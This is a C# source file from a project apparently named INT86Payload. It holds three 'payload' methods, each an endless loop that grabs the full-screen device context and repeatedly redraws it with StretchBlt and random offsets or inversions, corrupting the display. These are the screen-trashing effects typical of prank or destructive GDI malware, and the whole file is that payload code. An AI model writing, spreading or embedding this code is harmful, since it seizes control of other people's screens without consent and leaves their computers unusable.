using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace INT86Payload
{
    public class gdi
    {
        public void gdi_payload()
        {
            int count = 50;
            while (true)
            {
                Random rand;
                rand = new Random();
                int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr hdc = dllimport.dport.GetDC(IntPtr.Zero);
                dllimport.dport.StretchBlt(hdc, (rand.Next(2) == 1) ? -16 : 16, (rand.Next(2) == 1) ? -16 : 16, x, y, hdc, 0, 0,
                x, y, dllimport.dport.TernaryRasterOperations./*SRCAND*/SRCCOPY);
                dllimport.dport.DeleteDC(hdc);
                if (count != 10)
                    Thread.Sleep(count -= 10);
                else
                    Thread.Sleep(1);
            }
        }

        public void gdi2_payload()
        {
            while (true)
            {
                Random rand;
                rand = new Random();
                int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr hdc = dllimport.dport.GetDC(IntPtr.Zero);
                dllimport.dport.StretchBlt(hdc, (rand.Next(2) == 1) ? -2 : -4, (rand.Next(2) == 1) ? -2 : -4, x - -4, y - -4, hdc, 0, 0,
                x, y, dllimport.dport.TernaryRasterOperations./*SRCAND*/SRCPAINT);
                dllimport.dport.DeleteDC(hdc);

                Thread.Sleep(1000);
            }
        }
        public void gdi3_payload()
        {
            while (true)
            {
                Random rand;
                rand = new Random();
                int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr hdc = dllimport.dport.GetDC(IntPtr.Zero);
                dllimport.dport.StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0,
                x, y, dllimport.dport.TernaryRasterOperations.PATINVERT);
                dllimport.dport.DeleteDC(hdc);

                Thread.Sleep(1000);
            }
        }
    }
}